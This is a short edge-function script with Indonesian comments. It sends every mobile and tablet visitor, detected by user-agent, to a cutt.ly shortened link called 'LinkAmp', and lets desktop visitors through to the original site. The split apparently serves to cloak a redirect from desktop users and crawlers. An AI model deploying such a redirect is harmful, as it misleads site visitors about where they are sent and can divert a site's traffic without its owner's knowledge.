export default async (request: Request) => {
  const ua = request.headers.get('user-agent') || '';
  // Deteksi Android, iPhone, iPad, iPod, dan tablet
  if (
    /android/i.test(ua) ||
    /iphone/i.test(ua) ||
    /ipad/i.test(ua) ||
    /ipod/i.test(ua) ||
    /tablet/i.test(ua)
  ) {
    return Response.redirect('https://cutt.ly/LinkAmp/', 302);
  }
  // Jika bukan perangkat mobile/tablet, lanjutkan ke situs asli
  return;
};

export const config = { path: "/*" };